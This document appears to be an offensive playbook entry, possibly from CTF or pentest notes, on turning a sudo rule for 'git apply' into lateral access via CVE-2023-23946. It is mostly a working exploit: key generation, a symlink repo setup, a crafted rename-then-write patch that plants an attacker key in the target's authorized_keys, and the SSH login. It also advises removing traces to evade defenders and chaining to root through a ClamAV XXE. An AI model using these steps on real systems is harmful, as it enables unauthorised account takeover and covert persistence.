# sudo git apply — Symlink Rename Lateral (CVE-2023-23946)

## When this applies

`sudo -l` reveals a rule like:
```
(targetuser) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```
or any variant that lets you run `git apply` as another user with a controllable patch path.

Pre-2.39.2 git enforced "no writes through symlinks introduced by the patch" but failed when the patch RENAMES an existing symlink and then writes a NEW file inside the renamed-symlink path. Result: you write attacker-chosen content as `targetuser` to any file the new path points at — typically `~/.ssh/authorized_keys`.

This is CVE-2023-23946. Affects git ≤ 2.39.1. Default Ubuntu 22.04 ships git 2.34.1 (vulnerable).

## Exploit

1. Generate an SSH key pair on the attacker host:
   ```bash
   ssh-keygen -t ed25519 -f ./pwn -N "" -q
   ```

2. As your low-priv user (here cbrown), prepare the repo:
   ```bash
   mkdir -p /dev/shm/ssh && cd /dev/shm/ssh
   git init -q
   ln -s /home/<targetuser>/.ssh symlink
   git add symlink
   git -c user.email=a@b -c user.name=a commit -m x -q
   chmod 777 /dev/shm/ssh   # so 'targetuser' can write inside
   ```

3. Craft the patch. Two diffs in one file: rename the symlink, then create a file beneath the renamed name:
   ```diff
   diff --git a/symlink b/renamed-symlink
   similarity index 100%
   rename from symlink
   rename to renamed-symlink
   --
   diff --git /dev/null b/renamed-symlink/authorized_keys
   new file mode 100644
   index 0000000..039727e
   --- /dev/null
   +++ b/renamed-symlink/authorized_keys
   @@ -0,0 +1,1 @@
   +<contents of pwn.pub goes here>
   ```

4. Apply as the target user (regex must match the filename):
   ```bash
   sudo -u <targetuser> /usr/bin/git apply -v patch
   ```
   Output: `Applied patch symlink => renamed-symlink cleanly. Applied patch renamed-symlink/authorized_keys cleanly.`

5. SSH in:
   ```bash
   ssh -i ./pwn <targetuser>@<host>
   ```

## Why it works

git's symlink protection runs against the working tree at patch start. The symlink `symlink → /home/X/.ssh` gets RENAMED to `renamed-symlink` (which is also a symlink, but git's tracking lost the "this is a symlink to outside" state by the time the second hunk runs). The second hunk then creates `renamed-symlink/authorized_keys` — git resolves the path, follows the symlink, and writes to `/home/X/.ssh/authorized_keys` as the SUDO user.

## sudoers regex pitfalls

The regex `[a-zA-Z0-9.]+$` only restricts the patch FILENAME, not flags or content. Any `[a-zA-Z0-9.]+` filename works (`patch`, `p.diff`, `Aa.bB`). It does NOT prevent multi-hunk patches, symlink hunks, or hunks that touch absolute paths.

## Common pitfalls

- Patch must end with a final newline; missing newline = `corrupt patch at line N`.
- `chmod 777 /dev/shm/ssh` matters — git needs to write the renamed symlink atomically as `targetuser`; permission denied otherwise.
- `/dev/shm` is typically tmpfs and unaffected by per-user quota.
- If the target is `~/.ssh/authorized_keys`, ensure `~/.ssh` itself exists. The exploit creates a NEW file under the existing dir; it doesn't `mkdir -p`.
- After privesc, drop the symlink (`rm /home/<targetuser>/.ssh/authorized_keys` or remove only the appended key) when leaving — leftover keys are how blue team finds you.

## Related

- For the inverse case (writing READ access via symlinks): see `lfi-to-rce.md` symlink-create + double-read.
- The git apply chain combos beautifully with `clamscan --debug` XXE (CVE-2023-20052) for sbrown→root if the lateral target has that sudo rule. See `clamav-debug-xxe.md`.
